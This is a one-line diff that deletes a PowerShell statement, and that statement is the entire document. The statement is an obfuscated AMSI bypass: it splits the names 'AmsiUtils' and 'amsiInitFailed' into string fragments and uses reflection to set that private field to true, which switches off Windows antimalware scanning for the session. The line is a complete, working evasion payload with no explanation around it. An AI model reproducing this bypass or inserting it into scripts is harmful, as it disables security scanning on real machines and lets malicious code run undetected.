@@ -1,1 +1,0 @@
-[Ref].Assembly.GetType('System.Management.Automation.Am'+'si'+'U'+'ti'+'ls').GetField('a'+'msi'+'I'+'ni'+'tF'+'a'+'il'+'ed','NonPublic,Static').SetValue($null,$true)
